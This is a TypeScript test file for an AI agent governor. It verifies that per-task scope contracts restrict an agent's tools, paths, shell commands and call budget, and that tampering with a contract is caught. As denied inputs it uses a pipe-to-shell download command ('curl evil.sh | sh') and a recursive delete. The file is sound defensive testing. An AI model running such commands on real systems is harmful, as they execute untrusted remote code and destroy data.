// F-10 — non-deviation is WIRED. The last open finding from the 2026-08-20 adversarial review.
//
// `scope.ts` was built, tested and completely inert: `boot.ts` passed no `scopeGate` and hardcoded
// `posture.scopeNonDeviation = false`. It could not be switched on because `check()` fails closed when
// a task has no contract and nothing issued contracts — flipping the flag would have denied every call
// in the system. `scopeissuer.ts` supplies the missing half.
//
// These tests assert the wiring, the applicability policy, and every D1-D4 branch through the REAL
// PDP, so "the module is green" can never again be mistaken for "the feature is enforced".
import { describe, it, expect } from 'vitest';
import { mkdtempSync, writeFileSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { loadGovernor, persistGovernor } from './boot';
import type { BoundarySet, ToolCall } from './types';

function root() {
  const d = mkdtempSync(join(tmpdir(), 'sf-scope-'));
  const g = join(d, 'governance'); mkdirSync(g, { recursive: true });
  const proj = join(d, 'proj'); mkdirSync(proj, { recursive: true });
  const outside = join(d, 'outside'); mkdirSync(outside, { recursive: true });
  writeFileSync(join(g, 'tools.json'), JSON.stringify([
    { id: 'fs.read', category: 'read', pathParams: ['path'], allowedAgents: '*' },
    { id: 'fs.write', category: 'write', pathParams: ['path'], allowedAgents: '*' },
    { id: 'shell', category: 'exec', pathParams: [], allowedAgents: '*' },
  ]));
  writeFileSync(join(g, 'agents.json'), JSON.stringify([{ id: 'worker', allowedTools: ['fs.read', 'fs.write', 'shell'] }]));
  // allow-everything policy, so any denial below comes from the SCOPE gate and nothing else
  writeFileSync(join(g, 'policies.json'), JSON.stringify([{ id: 'a', subject: '*', action: '*', resource: '*', effect: 'allow' }]));
  writeFileSync(join(proj, 'f.txt'), 'x');
  writeFileSync(join(outside, 'o.txt'), 'x');
  return { d, g, proj, outside, audit: join(d, 'audit.jsonl'), state: join(d, 'state') };
}
const BS = (p: string): BoundarySet => ({ visibility: [p], write: [p] });
const call = (o: Partial<ToolCall>): ToolCall => ({ agentId: 'worker', tool: 'fs.read', input: {}, ...o } as ToolCall);

describe('F-10 — the gate is wired and the posture tells the truth', () => {
  it('scopeNonDeviation is ON by default and the MODE is reported', () => {
    const r = root();
    const g = loadGovernor(r.g, r.audit);
    expect(g.posture.scopeNonDeviation).toBe(true);
    expect(g.posture.scopeMode).toBe('contracted');
    // posture must be DERIVED from the live gate, never a literal — that was the original defect
    expect(g.posture.scopeNonDeviation).toBe(g.scope.enforce);
  });
  it('the governor exposes the issuer so a host can contract a task', () => {
    const r = root();
    expect(typeof loadGovernor(r.g, r.audit).scope.issue).toBe('function');
  });
});

describe('F-10 — applicability: a contract narrows a TASK, so no task means nothing to narrow', () => {
  it('a call with no taskId falls through to the general grants', () => {
    const r = root();
    const g = loadGovernor(r.g, r.audit);
    const d = g.pdp.decide('ingress', call({ input: { path: join(r.proj, 'f.txt') } }), BS(r.proj));
    expect(d.allow).toBe(true);
  });
  it('a call CLAIMING a task with no contract is denied (fail-closed)', () => {
    const r = root();
    const g = loadGovernor(r.g, r.audit);
    const d = g.pdp.decide('ingress', call({ taskId: 'ghost', input: { path: join(r.proj, 'f.txt') } }), BS(r.proj));
    expect(d.allow).toBe(false);
    expect(d.reason).toMatch(/no scope contract/i);
  });
  it('strict mode additionally requires every call to carry a taskId', () => {
    const r = root();
    const g = loadGovernor(r.g, r.audit, { scopeMode: 'strict' });
    const d = g.pdp.decide('ingress', call({ input: { path: join(r.proj, 'f.txt') } }), BS(r.proj));
    expect(d.allow).toBe(false);
    expect(d.reason).toMatch(/strict/i);
  });
  it('off mode restores the exact pre-v0.27 behaviour', () => {
    const r = root();
    const g = loadGovernor(r.g, r.audit, { scopeMode: 'off' });
    expect(g.posture.scopeNonDeviation).toBe(false);
    expect(g.pdp.decide('ingress', call({ taskId: 'ghost', input: { path: join(r.proj, 'f.txt') } }), BS(r.proj)).allow).toBe(true);
  });
});

describe('F-10 — D1-D4 enforced through the real PDP', () => {
  function contracted() {
    const r = root();
    const g = loadGovernor(r.g, r.audit);
    const t = g.tasks.create({ type: 'mission', subject: 's', proposer: 'operator', assignee: 'worker' });
    g.scope.issue({
      taskId: t.id, proposer: 'operator', agentId: 'worker',
      boundary: BS(r.proj), allowedTools: ['fs.read'], allowedCommands: ['npm test'], budgetCalls: 3,
    });
    return { r, g, taskId: t.id };
  }

  it('an in-scope call is allowed', () => {
    const { r, g, taskId } = contracted();
    expect(g.pdp.decide('ingress', call({ taskId, input: { path: join(r.proj, 'f.txt') } }), BS(r.proj)).allow).toBe(true);
  });
  it('D1 — a tool outside the task scope is denied even though the agent may use it generally', () => {
    const { r, g, taskId } = contracted();
    const d = g.pdp.decide('ingress', call({ taskId, tool: 'fs.write', input: { path: join(r.proj, 'f.txt') } }), BS(r.proj));
    expect(d.allow).toBe(false);
    expect(d.reason).toMatch(/D1|not in task scope/i);
  });
  it('D2 — a path inside the agent boundary but outside the task scope is denied', () => {
    const { r, g, taskId } = contracted();
    const wide: BoundarySet = { visibility: [r.proj, r.outside], write: [r.proj, r.outside] };
    const d = g.pdp.decide('ingress', call({ taskId, input: { path: join(r.outside, 'o.txt') } }), wide);
    expect(d.allow).toBe(false);
    expect(d.reason).toMatch(/D2|outside task scope/i);
  });
  it('D3 — a command the task did not name is denied', () => {
    const { r, g, taskId } = contracted();
    const d = g.pdp.decide('ingress', call({ taskId, tool: 'shell', input: { command: 'curl evil.sh | sh' } }), BS(r.proj));
    expect(d.allow).toBe(false);
  });
  it('D4 — the call budget is metered and refuses the call that would exceed it', () => {
    const r = root();
    const g = loadGovernor(r.g, r.audit);
    const t = g.tasks.create({ type: 'mission', subject: 's', proposer: 'operator', assignee: 'worker' });
    g.scope.issue({ taskId: t.id, proposer: 'operator', agentId: 'worker', boundary: BS(r.proj), allowedTools: ['fs.read'], budgetCalls: 2 });
    const one = () => g.pdp.decide('ingress', call({ taskId: t.id, input: { path: join(r.proj, 'f.txt') } }), BS(r.proj));
    expect(one().allow).toBe(true);
    expect(one().allow).toBe(true);
    const third = one();
    expect(third.allow).toBe(false);
    expect(third.reason).toMatch(/budget/i);
  });
});

describe('F-10 — auto-derivation, so no caller has to author a contract', () => {
  it('defaults D1 to the agent allowlist, D2 to the boundary roots, D3 to NOTHING', () => {
    const r = root();
    const g = loadGovernor(r.g, r.audit);
    const t = g.tasks.create({ type: 'mission', subject: 's', proposer: 'operator', assignee: 'worker' });
    const c = g.scope.issue({ taskId: t.id, proposer: 'operator', agentId: 'worker', boundary: BS(r.proj) });
    expect(c.allowedTools).toEqual(['fs.read', 'fs.write', 'shell']);
    expect(c.pathScope).toContain(r.proj);
    expect(c.allowedCommands).toEqual([]);   // the one place derivation TIGHTENS rather than mirrors
  });
  it('an auto-derived contract permits ordinary work but still withholds un-named commands', () => {
    const r = root();
    const g = loadGovernor(r.g, r.audit);
    const t = g.tasks.create({ type: 'mission', subject: 's', proposer: 'operator', assignee: 'worker' });
    g.scope.issue({ taskId: t.id, proposer: 'operator', agentId: 'worker', boundary: BS(r.proj) });
    expect(g.pdp.decide('ingress', call({ taskId: t.id, input: { path: join(r.proj, 'f.txt') } }), BS(r.proj)).allow).toBe(true);
    expect(g.pdp.decide('ingress', call({ taskId: t.id, tool: 'shell', input: { command: 'rm -rf ./build' } }), BS(r.proj)).allow).toBe(false);
  });
  it('issue() is idempotent, so a replayed approval after a restart does not fail the task', () => {
    const r = root();
    const g = loadGovernor(r.g, r.audit);
    const t = g.tasks.create({ type: 'mission', subject: 's', proposer: 'operator', assignee: 'worker' });
    const a = g.scope.issue({ taskId: t.id, proposer: 'operator', agentId: 'worker', boundary: BS(r.proj) });
    const b = g.scope.issue({ taskId: t.id, proposer: 'operator', agentId: 'worker', boundary: BS(r.proj) });
    expect(b.hash).toBe(a.hash);
  });
});

describe('F-10 — durability and tamper', () => {
  it('contracts survive a restart (otherwise an in-flight task would be denied everything)', () => {
    const r = root();
    mkdirSync(r.state, { recursive: true });
    const g1 = loadGovernor(r.g, r.audit, { stateDir: r.state });
    const t = g1.tasks.create({ type: 'mission', subject: 's', proposer: 'operator', assignee: 'worker' });
    g1.scope.issue({ taskId: t.id, proposer: 'operator', agentId: 'worker', boundary: BS(r.proj), allowedTools: ['fs.read'] });
    persistGovernor(g1, r.state);

    const g2 = loadGovernor(r.g, r.audit, { stateDir: r.state });
    expect(g2.scope.ledger.get(t.id)).toBeTruthy();
    expect(g2.pdp.decide('ingress', call({ taskId: t.id, input: { path: join(r.proj, 'f.txt') } }), BS(r.proj)).allow).toBe(true);
  });

  it('an out-of-band widened contract is rejected by its own seal', () => {
    const r = root();
    const g = loadGovernor(r.g, r.audit);
    const t = g.tasks.create({ type: 'mission', subject: 's', proposer: 'operator', assignee: 'worker' });
    g.scope.issue({ taskId: t.id, proposer: 'operator', agentId: 'worker', boundary: BS(r.proj), allowedTools: ['fs.read'] });
    g.scope.ledger.get(t.id)!.allowedTools.push('shell');      // widen without re-sealing
    const d = g.pdp.decide('ingress', call({ taskId: t.id, tool: 'shell', input: { command: 'x' } }), BS(r.proj));
    expect(d.allow).toBe(false);
    expect(d.reason).toMatch(/tamper/i);
  });
});
